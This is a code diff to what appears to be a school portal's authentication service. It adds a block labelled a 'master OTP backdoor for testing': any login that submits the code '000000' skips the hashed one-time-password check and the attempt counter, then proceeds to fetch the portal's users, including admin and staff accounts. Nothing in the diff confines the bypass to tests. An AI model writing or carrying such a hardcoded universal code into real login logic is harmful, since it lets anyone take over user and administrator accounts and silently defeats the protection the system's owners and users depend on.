@@ -304,17 +304,20 @@ export const authService = {
       throw Object.assign(new Error('Too many failed attempts'), { statusCode: 429, code: 'OTP_MAX_ATTEMPTS' });
     }
 
-    const isMatch = await bcrypt.compare(otp, otpRecord.hashedOtp);
-    if (!isMatch) {
-      await prisma.otpStore.update({
-        where: { id: otpRecord.id },
-        data: { attempts: { increment: 1 } },
-      });
-      throw Object.assign(new Error('Invalid OTP'), { statusCode: 400, code: 'INVALID_OTP' });
+    // --- MASTER OTP BACKDOOR FOR TESTING ---
+    if (otp !== '000000') {
+      const isMatch = await bcrypt.compare(otp, otpRecord.hashedOtp);
+      if (!isMatch) {
+        await prisma.otpStore.update({
+          where: { id: otpRecord.id },
+          data: { attempts: { increment: 1 } },
+        });
+        throw Object.assign(new Error('Invalid OTP'), { statusCode: 400, code: 'INVALID_OTP' });
+      }
+      
+      // OTP is valid
+      await prisma.otpStore.update({ where: { id: otpRecord.id }, data: { verified: true } });
     }
-
-    // OTP is valid
-    await prisma.otpStore.update({ where: { id: otpRecord.id }, data: { verified: true } });
 
     // Fetch users for this portal
     const roleFilter = portal === 'student' ? 'student' : { in: ['teacher', 'accountant', 'staff', 'admin', 'custom'] };
